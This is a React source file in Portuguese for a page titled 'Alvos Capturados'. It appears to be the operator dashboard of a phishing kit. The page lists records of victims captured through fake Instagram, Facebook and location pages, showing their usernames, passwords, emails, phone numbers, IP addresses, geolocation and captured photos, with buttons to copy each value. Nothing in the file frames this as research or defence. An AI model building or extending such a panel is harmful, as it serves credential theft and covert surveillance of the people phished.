"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { ref, onValue, off } from "firebase/database"
import { database } from "@/lib/firebase"
import {
  Search,
  Target,
  Instagram,
  Facebook,
  MapPin,
  Eye,
  Calendar,
  Copy,
  Check,
  User,
  Lock,
  Mail,
  Phone,
  Globe,
  ImageIcon,
  X,
  Trash2,
} from "lucide-react"
import { cn } from "@/lib/utils"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Separator } from "@/components/ui/separator"
import { getCurrentUserId } from "@/lib/user-context"
import { deleteCapture } from "@/lib/delete-capture"
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog"

interface CapturedData {
  id: string
  pageId?: string
  pageName: string
  pageType: "instagram" | "facebook" | "location" | "unknown"
  data: Record<string, any>
  timestamp: number
  ipAddress?: string
  formData?: { photo?: string }
}

export default function AlvosPage() {
  const [captures, setCaptures] = useState<CapturedData[]>([])
  const [searchQuery, setSearchQuery] = useState("")
  const [loading, setLoading] = useState(true)
  const [selectedCapture, setSelectedCapture] = useState<CapturedData | null>(null)
  const [copiedField, setCopiedField] = useState<string | null>(null)
  const [showPhotoModal, setShowPhotoModal] = useState(false)
  const [captureToDelete, setCaptureToDelete] = useState<CapturedData | null>(null)
  const [isDeleting, setIsDeleting] = useState(false)

  useEffect(() => {
    const userId = getCurrentUserId()

    if (!userId) {
      console.log("[v0] No user logged in")
      setLoading(false)
      return
    }

    const capturesRef = ref(database, `alvos/${userId}`)

    console.log("[v0] Listening to Firebase path: alvos/" + userId)

    const handleData = (snapshot: any) => {
      console.log("[v0] Firebase snapshot received:", snapshot.exists())
      if (snapshot.exists()) {
        const data = snapshot.val()
        console.log("[v0] Data from Firebase:", data)

        const capturesArray: CapturedData[] = Object.entries(data).map(([id, value]: [string, any]) => {
          const pageName = value.pageName || value.page || "Captura Desconhecida"
          const pageType = (value.pageType || value.page || value.type || "unknown").toLowerCase()
          const timestamp = value.timestamp ? new Date(value.timestamp).getTime() : Date.now()

          console.log(`[v0] Capture ${id}: pageName="${pageName}", pageType="${pageType}"`)

          return {
            id,
            pageId: value.pageId,
            pageName,
            pageType,
            data: value.data || {},
            timestamp,
            ipAddress: value.ipAddress,
            formData: value.formData,
          }
        })

        console.log("[v0] Processed captures:", capturesArray.length)
        console.log("[v0] Instagram count:", capturesArray.filter((c) => c.pageType === "instagram").length)
        console.log("[v0] Facebook count:", capturesArray.filter((c) => c.pageType === "facebook").length)
        setCaptures(capturesArray.sort((a, b) => b.timestamp - a.timestamp))
      } else {
        console.log("[v0] No data found in alvos path for user:", userId)
        setCaptures([])
      }
      setLoading(false)
    }

    onValue(capturesRef, handleData)

    return () => {
      off(capturesRef, "value", handleData)
    }
  }, [])

  const filteredCaptures = captures.filter((capture) => {
    const searchLower = searchQuery.toLowerCase()
    const pageName = capture.pageName?.toLowerCase() || ""
    const pageType = capture.pageType?.toLowerCase() || ""
    const dataString = JSON.stringify(capture.data).toLowerCase()

    return pageName.includes(searchLower) || pageType.includes(searchLower) || dataString.includes(searchLower)
  })

  const getPageIcon = (type: string) => {
    switch (type) {
      case "instagram":
        return Instagram
      case "facebook":
        return Facebook
      case "location":
        return MapPin
      default:
        return Target
    }
  }

  const getPageColor = (type: string) => {
    switch (type) {
      case "instagram":
        return "bg-pink-500/10 text-pink-500 border-pink-500/20"
      case "facebook":
        return "bg-blue-500/10 text-blue-500 border-blue-500/20"
      case "location":
        return "bg-green-500/10 text-green-500 border-green-500/20"
      default:
        return "bg-primary/10 text-primary border-primary/20"
    }
  }

  const formatDate = (timestamp: number) => {
    const date = new Date(timestamp)
    return date.toLocaleDateString("pt-BR", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    })
  }

  const getFieldIcon = (key: string) => {
    const lowerKey = key.toLowerCase()
    if (lowerKey.includes("user") || lowerKey.includes("nome")) return User
    if (lowerKey.includes("pass") || lowerKey.includes("senha")) return Lock
    if (lowerKey.includes("email") || lowerKey.includes("mail")) return Mail
    if (lowerKey.includes("phone") || lowerKey.includes("tel") || lowerKey.includes("celular")) return Phone
    if (lowerKey.includes("photo") || lowerKey.includes("foto") || lowerKey.includes("image")) return ImageIcon
    if (
      lowerKey.includes("location") ||
      lowerKey.includes("local") ||
      lowerKey.includes("lat") ||
      lowerKey.includes("long")
    )
      return MapPin
    return Globe
  }

  const copyToClipboard = (text: string, fieldId: string) => {
    navigator.clipboard.writeText(text)
    setCopiedField(fieldId)
    setTimeout(() => setCopiedField(null), 2000)
  }

  const formatFieldName = (key: string) => {
    return key
      .replace(/([A-Z])/g, " $1")
      .replace(/^./, (str) => str.toUpperCase())
      .trim()
  }

  const handleDeleteCapture = async () => {
    if (!captureToDelete) return

    setIsDeleting(true)
    const success = await deleteCapture(captureToDelete.id)

    if (success) {
      // Close dialog if the deleted capture was selected
      if (selectedCapture?.id === captureToDelete.id) {
        setSelectedCapture(null)
      }
    }

    setIsDeleting(false)
    setCaptureToDelete(null)
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-[400px]">
        <div className="text-center space-y-3">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto" />
          <p className="text-muted-foreground">Carregando alvos capturados...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="space-y-2">
        <h1 className="text-3xl font-bold text-foreground text-balance">Alvos Capturados</h1>
        <p className="text-muted-foreground">
          Visualize informações capturadas automaticamente das páginas de login e formulários
        </p>
      </div>

      {/* Stats */}
      <div className="grid gap-4 md:grid-cols-4">
        <Card className="glass-effect border-border/50">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-muted-foreground">Total de Capturas</p>
                <p className="text-3xl font-bold text-foreground">{captures.length}</p>
              </div>
              <div className="p-3 rounded-lg bg-primary/10 border border-primary/20">
                <Target className="h-6 w-6 text-primary" />
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="glass-effect border-border/50">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-muted-foreground">Instagram</p>
                <p className="text-3xl font-bold text-foreground">
                  {captures.filter((c) => c.pageType === "instagram").length}
                </p>
              </div>
              <div className="p-3 rounded-lg bg-pink-500/10 border border-pink-500/20">
                <Instagram className="h-6 w-6 text-pink-500" />
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="glass-effect border-border/50">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-muted-foreground">Facebook</p>
                <p className="text-3xl font-bold text-foreground">
                  {captures.filter((c) => c.pageType === "facebook").length}
                </p>
              </div>
              <div className="p-3 rounded-lg bg-blue-500/10 border border-blue-500/20">
                <Facebook className="h-6 w-6 text-blue-500" />
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="glass-effect border-border/50">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-muted-foreground">Localização</p>
                <p className="text-3xl font-bold text-foreground">
                  {captures.filter((c) => c.pageType === "location").length}
                </p>
              </div>
              <div className="p-3 rounded-lg bg-green-500/10 border border-green-500/20">
                <MapPin className="h-6 w-6 text-green-500" />
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Search */}
      {captures.length > 0 && (
        <div className="relative">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
          <Input
            placeholder="Buscar por página, tipo ou dados capturados..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="pl-10 bg-secondary/50 border-border/50 focus:border-primary"
          />
        </div>
      )}

      {/* Captures list */}
      {filteredCaptures.length === 0 ? (
        <Card className="glass-effect border-border/50">
          <CardContent className="flex flex-col items-center justify-center py-16">
            <div className="p-4 rounded-full bg-muted/50 mb-4">
              <Target className="h-8 w-8 text-muted-foreground" />
            </div>
            <h3 className="text-lg font-semibold text-foreground mb-2">
              {searchQuery ? "Nenhuma captura encontrada" : "Nenhum alvo capturado ainda"}
            </h3>
            <p className="text-sm text-muted-foreground text-center max-w-md">
              {searchQuery
                ? "Tente buscar com outros termos"
                : "As informações capturadas dos formulários de login aparecerão aqui automaticamente"}
            </p>
          </CardContent>
        </Card>
      ) : (
        <div className="space-y-4">
          {filteredCaptures.map((capture) => {
            const PageIcon = getPageIcon(capture.pageType)
            const hasPhoto = capture.formData?.photo

            return (
              <Card
                key={capture.id}
                className="glass-effect border-border/50 hover:border-primary/30 transition-all cursor-pointer group"
                onClick={() => setSelectedCapture(capture)}
              >
                <CardHeader>
                  <div className="flex items-start justify-between">
                    <div className="space-y-2 flex-1">
                      <div className="flex items-center gap-3">
                        <div className={cn("p-2 rounded-lg border", getPageColor(capture.pageType))}>
                          <PageIcon className="h-4 w-4" />
                        </div>
                        <div className="flex-1">
                          <CardTitle className="text-foreground">{capture.pageName}</CardTitle>
                          <CardDescription className="flex items-center gap-2 flex-wrap mt-1">
                            <Badge
                              variant="outline"
                              className={cn("capitalize text-xs", getPageColor(capture.pageType))}
                            >
                              {capture.pageType}
                            </Badge>
                            <span className="text-xs text-muted-foreground flex items-center gap-1">
                              <Calendar className="h-3 w-3" />
                              {formatDate(capture.timestamp)}
                            </span>
                            {capture.ipAddress && (
                              <Badge variant="outline" className="text-xs">
                                <Globe className="h-3 w-3 mr-1" />
                                {capture.ipAddress}
                              </Badge>
                            )}
                            {hasPhoto && (
                              <Badge variant="outline" className="text-xs border-purple-500/30 text-purple-400">
                                <ImageIcon className="h-3 w-3 mr-1" />
                                Foto
                              </Badge>
                            )}
                          </CardDescription>
                        </div>
                      </div>
                    </div>
                    <div className="flex items-center gap-1">
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-8 w-8 opacity-0 group-hover:opacity-100 transition-opacity hover:bg-red-500/20 hover:text-red-400"
                        onClick={(e) => {
                          e.stopPropagation()
                          setCaptureToDelete(capture)
                        }}
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-8 w-8 opacity-0 group-hover:opacity-100 transition-opacity"
                      >
                        <Eye className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                </CardHeader>
                <CardContent>
                  <div className="space-y-3">
                    <p className="text-sm font-medium text-foreground">Dados Capturados:</p>
                    <div className="grid gap-2">
                      {Object.entries(capture.data)
                        .slice(0, 3)
                        .map(([key, value]) => {
                          const FieldIcon = getFieldIcon(key)
                          return (
                            <div
                              key={key}
                              className="flex items-center gap-3 p-3 rounded-lg bg-secondary/30 border border-border/30"
                            >
                              <div className="p-2 rounded-md bg-primary/10 border border-primary/20">
                                <FieldIcon className="h-3.5 w-3.5 text-primary" />
                              </div>
                              <div className="flex-1 min-w-0">
                                <p className="text-xs font-medium text-muted-foreground capitalize">
                                  {formatFieldName(key)}
                                </p>
                                <p className="text-sm text-foreground font-medium truncate">{String(value)}</p>
                              </div>
                            </div>
                          )
                        })}
                      {Object.keys(capture.data).length > 3 && (
                        <div className="text-center py-2">
                          <Badge variant="secondary" className="text-xs">
                            +{Object.keys(capture.data).length - 3} campos adicionais
                          </Badge>
                        </div>
                      )}
                    </div>
                  </div>
                </CardContent>
              </Card>
            )
          })}
        </div>
      )}

      <Dialog open={!!selectedCapture} onOpenChange={(open) => !open && setSelectedCapture(null)}>
        <DialogContent className="max-w-2xl max-h-[80vh] overflow-y-auto">
          {selectedCapture && (
            <>
              <DialogHeader>
                <div className="flex items-start gap-3">
                  <div className={cn("p-3 rounded-lg border", getPageColor(selectedCapture.pageType))}>
                    {(() => {
                      const Icon = getPageIcon(selectedCapture.pageType)
                      return <Icon className="h-5 w-5" />
                    })()}
                  </div>
                  <div className="flex-1">
                    <DialogTitle className="text-xl">{selectedCapture.pageName}</DialogTitle>
                    <DialogDescription className="flex items-center gap-2 flex-wrap mt-2">
                      <Badge variant="outline" className={cn("capitalize", getPageColor(selectedCapture.pageType))}>
                        {selectedCapture.pageType}
                      </Badge>
                      <span className="text-xs text-muted-foreground flex items-center gap-1">
                        <Calendar className="h-3 w-3" />
                        {formatDate(selectedCapture.timestamp)}
                      </span>
                      {selectedCapture.ipAddress && (
                        <Badge variant="outline" className="text-xs">
                          <Globe className="h-3 w-3 mr-1" />
                          {selectedCapture.ipAddress}
                        </Badge>
                      )}
                    </DialogDescription>
                  </div>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 hover:bg-red-500/20 hover:text-red-400"
                    onClick={(e) => {
                      e.stopPropagation()
                      setCaptureToDelete(selectedCapture)
                    }}
                  >
                    <Trash2 className="h-4 w-4" />
                  </Button>
                </div>
              </DialogHeader>

              <Separator className="my-4" />

              <div className="space-y-4">
                {selectedCapture.formData?.photo && (
                  <div className="space-y-2">
                    <h3 className="text-sm font-semibold text-foreground">Foto Capturada</h3>
                    <div
                      className="relative rounded-lg overflow-hidden border border-border/50 cursor-pointer hover:border-primary/50 transition-colors"
                      onClick={() => setShowPhotoModal(true)}
                    >
                      <img
                        src={selectedCapture.formData.photo || "/placeholder.svg"}
                        alt="Foto capturada"
                        className="w-full h-auto"
                      />
                      <div className="absolute inset-0 bg-black/0 hover:bg-black/10 transition-colors flex items-center justify-center">
                        <Eye className="h-8 w-8 text-white opacity-0 hover:opacity-100 transition-opacity" />
                      </div>
                    </div>
                  </div>
                )}

                <div>
                  <h3 className="text-sm font-semibold text-foreground mb-3">Informações Capturadas</h3>
                  <div className="space-y-2">
                    {Object.entries(selectedCapture.data).map(([key, value]) => {
                      const FieldIcon = getFieldIcon(key)
                      const fieldId = `${selectedCapture.id}-${key}`
                      const isCopied = copiedField === fieldId

                      return (
                        <div
                          key={key}
                          className="group flex items-start gap-3 p-4 rounded-lg bg-secondary/50 border border-border/50 hover:border-primary/30 transition-colors"
                        >
                          <div className="p-2 rounded-md bg-primary/10 border border-primary/20 mt-0.5">
                            <FieldIcon className="h-4 w-4 text-primary" />
                          </div>
                          <div className="flex-1 min-w-0">
                            <p className="text-xs font-medium text-muted-foreground capitalize mb-1">
                              {formatFieldName(key)}
                            </p>
                            <p className="text-sm text-foreground font-medium break-all">{String(value)}</p>
                          </div>
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-8 w-8 opacity-0 group-hover:opacity-100 transition-opacity"
                            onClick={(e) => {
                              e.stopPropagation()
                              copyToClipboard(String(value), fieldId)
                            }}
                          >
                            {isCopied ? <Check className="h-4 w-4 text-green-500" /> : <Copy className="h-4 w-4" />}
                          </Button>
                        </div>
                      )
                    })}
                  </div>
                </div>

                <Separator />

                <div>
                  <h3 className="text-sm font-semibold text-foreground mb-3">Dados Brutos (JSON)</h3>
                  <div className="relative group">
                    <Button
                      variant="ghost"
                      size="sm"
                      className="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity z-10"
                      onClick={() => copyToClipboard(JSON.stringify(selectedCapture.data, null, 2), "json")}
                    >
                      {copiedField === "json" ? (
                        <>
                          <Check className="h-3 w-3 mr-1 text-green-500" />
                          <span className="text-xs">Copiado!</span>
                        </>
                      ) : (
                        <>
                          <Copy className="h-3 w-3 mr-1" />
                          <span className="text-xs">Copiar JSON</span>
                        </>
                      )}
                    </Button>
                    <div className="p-4 rounded-lg bg-secondary/50 border border-border/50">
                      <pre className="text-xs text-foreground font-mono overflow-x-auto">
                        {JSON.stringify(selectedCapture.data, null, 2)}
                      </pre>
                    </div>
                  </div>
                </div>
              </div>
            </>
          )}
        </DialogContent>
      </Dialog>

      {showPhotoModal && selectedCapture?.formData?.photo && (
        <div
          className="fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-4"
          onClick={() => setShowPhotoModal(false)}
        >
          <div className="relative max-w-4xl w-full">
            <Button
              variant="ghost"
              size="icon"
              className="absolute -top-12 right-0 text-white hover:bg-white/10"
              onClick={() => setShowPhotoModal(false)}
            >
              <X className="h-6 w-6" />
            </Button>
            <img
              src={selectedCapture.formData.photo || "/placeholder.svg"}
              alt="Foto capturada"
              className="w-full h-auto rounded-lg border-2 border-primary/50"
              onClick={(e) => e.stopPropagation()}
            />
            <div className="mt-4 text-center text-gray-400 text-sm">
              Capturada em {formatDate(selectedCapture.timestamp)}
            </div>
          </div>
        </div>
      )}

      <AlertDialog open={!!captureToDelete} onOpenChange={(open) => !open && setCaptureToDelete(null)}>
        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle>Confirmar Exclusão</AlertDialogTitle>
            <AlertDialogDescription>
              Tem certeza que deseja excluir esta captura? Esta ação não pode ser desfeita.
              {captureToDelete && (
                <div className="mt-3 p-3 rounded-lg bg-secondary/50 border border-border/50">
                  <div className="flex items-center gap-2 mb-1">
                    <Badge
                      variant="outline"
                      className={cn("capitalize text-xs", getPageColor(captureToDelete.pageType))}
                    >
                      {captureToDelete.pageType}
                    </Badge>
                  </div>
                  <p className="text-sm font-medium text-foreground">{captureToDelete.pageName}</p>
                  <p className="text-xs text-muted-foreground mt-1">{formatDate(captureToDelete.timestamp)}</p>
                </div>
              )}
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel>Cancelar</AlertDialogCancel>
            <AlertDialogAction
              onClick={handleDeleteCapture}
              disabled={isDeleting}
              className="bg-red-500 hover:bg-red-600 text-white"
            >
              {isDeleting ? "Excluindo..." : "Excluir"}
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  )
}
